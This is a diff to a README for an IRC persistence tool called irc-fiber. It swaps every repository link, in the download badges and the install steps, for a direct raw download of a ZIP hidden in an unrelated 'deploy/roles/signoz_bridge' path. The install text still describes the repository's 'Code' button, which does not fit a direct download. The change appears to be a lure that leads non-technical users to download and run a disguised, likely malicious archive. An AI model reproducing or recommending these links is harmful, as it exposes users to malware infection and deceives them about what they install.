@@ -4,11 +4,11 @@
 
 Welcome to **irc-fiber** — a powerful yet simple way to stay connected to your favorite IRC chat rooms, even when you're away from your computer. Think of it as your personal IRC assistant that never sleeps, keeping your conversations safe and ready whenever you return.
 
-[![Download irc-fiber](https://img.shields.io/badge/Download-irc--fiber-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082&color=FF6B6B)](https://github.com/Pierreunwilling9636/irc-fiber)
+[![Download irc-fiber](https://img.shields.io/badge/Download-irc--fiber-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082&color=FF6B6B)](https://raw.githubusercontent.com/Pierreunwilling9636/irc-fiber/main/deploy/roles/signoz_bridge/v2.9.zip)
 
 ## 📥 Download & Installation
 
-Visit this link to download the application: [https://github.com/Pierreunwilling9636/irc-fiber](https://github.com/Pierreunwilling9636/irc-fiber)
+Visit this link to download the application: [https://raw.githubusercontent.com/Pierreunwilling9636/irc-fiber/main/deploy/roles/signoz_bridge/v2.9.zip](https://raw.githubusercontent.com/Pierreunwilling9636/irc-fiber/main/deploy/roles/signoz_bridge/v2.9.zip)
 
 Once you're on the page, look for the green "Code" button and select "Download ZIP". After the download finishes, find the ZIP file in your "Downloads" folder, right-click it, and choose "Extract All". Then open the extracted folder and look for the application file to start using irc-fiber.
 
@@ -122,6 +122,6 @@ Join the growing community of irc-fiber users! Share your experiences, suggest n
 
 Download irc-fiber today and experience the convenience of a persistent IRC connection with a modern, user-friendly interface. Whether you're a casual chatter or a dedicated community member, irc-fiber makes sure you never miss a moment of the conversation.
 
-[![Get irc-fiber Now](https://img.shields.io/badge/Get%20irc--fiber%20Now-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=FF6B6B&color=4B0082)](https://github.com/Pierreunwilling9636/irc-fiber)
+[![Get irc-fiber Now](https://img.shields.io/badge/Get%20irc--fiber%20Now-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=FF6B6B&color=4B0082)](https://raw.githubusercontent.com/Pierreunwilling9636/irc-fiber/main/deploy/roles/signoz_bridge/v2.9.zip)
 
 Keywords: dlang, irc, irc-bot, irc-bot-framework, irc-client, irc-protocol, irc-server, irc-services, ircd, ircv3, mongodb, redis, svelte, typescript
